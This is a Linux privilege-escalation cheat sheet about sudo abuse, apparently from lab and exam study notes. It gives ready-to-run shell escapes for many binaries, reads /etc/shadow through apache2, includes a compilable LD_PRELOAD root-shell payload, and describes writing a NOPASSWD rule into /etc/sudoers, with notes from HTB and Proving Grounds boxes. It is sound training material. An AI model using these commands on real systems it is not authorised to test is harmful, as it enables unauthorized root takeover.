# Sudo Abuse

Back to [[Linux-PrivEsc-Methodology]]

## Enumerate
```bash
sudo -l
```

If `(ALL) NOPASSWD: /usr/bin/something` -- check [GTFOBins](https://gtfobins.github.io/#+sudo).

## Common Sudo Exploits

### vim
```bash
sudo vim -c ':!/bin/bash'
```

### find
```bash
sudo find / -exec /bin/bash \; -quit
```

### python / python3
```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

### perl
```bash
sudo perl -e 'exec "/bin/bash";'
```

### less / more
```bash
sudo less /etc/hosts
# Type: !bash
```

### awk
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

### env
```bash
sudo env /bin/bash
```

### man
```bash
sudo man man
# Type: !bash
```

### ftp
```bash
sudo ftp
# Type: !bash
```

### zip
```bash
sudo zip /tmp/x.zip /etc/hosts -T --unzip-command="bash -c '/bin/bash'"
```

### tar
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### apache2 (read files, not shell)
```bash
sudo apache2 -f /etc/shadow
```

## LD_PRELOAD

If `sudo -l` shows `env_keep+=LD_PRELOAD`:

```c
// shell.c
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/allowed_program
```

## LD_LIBRARY_PATH

If `env_keep+=LD_LIBRARY_PATH`:
```bash
# Check which libraries the allowed program loads
ldd /usr/bin/allowed_program

# Create malicious library with same name
# Compile and point LD_LIBRARY_PATH to it
```

## Password Reuse

Found a password somewhere? Try it:
```bash
sudo -l
# Enter found password
# If (ALL:ALL) ALL → instant root
sudo su
```

---

## From Your Boxes

> **CozyHosting** (HTB) — sudo -l revealed SSH with sudo; GTFOBins entry for ssh gave root
> - What worked: `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`
> - Lesson: GTFOBins sudo entries for SSH, vim, less, etc. are exam staples.

> **Knife** (HTB) — sudo -l revealed /usr/bin/knife (Chef tool) with NOPASSWD
> - What worked: `sudo knife exec -E 'exec "/bin/sh"'`
> - Lesson: Obscure binaries in sudo -l always have a GTFOBins or HackTricks entry. Google "[binary] gtfobins" immediately.

> **Sunday** (HTB) — sudo -l revealed wget with NOPASSWD
> - What worked: GTFOBins sudo entry for wget to read/write arbitrary files
> - Lesson: wget sudo = file overwrite privesc (same as SUID wget on XposedAPI).

> **TartarSauce** (HTB) — sudo -l as www-data could run tar as user onuma
> - What worked: GTFOBins sudo entry for tar to escalate to onuma
> - Lesson: Sudo to another user (not root) is still progress. Chain lateral + vertical privesc.

> **Walla** (PG) — sudo -l revealed python with NOPASSWD running a specific script
> - What worked: Overwrote the script wifi_reset.py with a reverse shell, then ran `sudo /usr/bin/python /home/walter/wifi_reset.py`
> - Lesson: If sudo runs a script you can write to, replace its contents.

> **Cockpit** (PG) — sudo tar with wildcard injection led to overwriting /etc/sudoers
> - What worked: Tar wildcard injection to write `james ALL=(root) NOPASSWD: ALL` into /etc/sudoers
> - Lesson: Sudo tar with wildcards (*) = checkpoint injection. Memorize the tar wildcard exploit.

> **LaVita** (PG) — sudo composer with NOPASSWD
> - What worked: GTFOBins sudo entry for composer
> - Lesson: Composer (PHP package manager) has a GTFOBins entry. Any scripting tool with sudo is dangerous.

> **PostFish** (PG) — sudo /usr/bin/mail with NOPASSWD
> - What worked: GTFOBins sudo entry for mail to spawn a shell
> - Lesson: mail command has a shell escape. Check GTFOBins for every binary in sudo -l.

> **Precious** (HTB) — sudo /usr/bin/ruby to run update_dependencies.rb with NOPASSWD
> - What worked: YAML deserialization in the ruby script to set SUID on /bin/bash
> - Lesson: When sudo runs a script that parses user-controlled input (YAML, JSON), look for injection.

> **Networked** (HTB) — sudo /usr/local/sbin/changename.sh with NOPASSWD
> - What worked: Command injection through network interface name parameter
> - Lesson: Sudo scripts that take user input are vulnerable to command injection via spaces in arguments.

> **Broker** (HTB) — sudo /usr/sbin/nginx with NOPASSWD
> - What worked: Configured nginx to serve /etc/shadow or get a root shell
> - Lesson: Web servers with sudo can be configured to serve sensitive files or execute code.
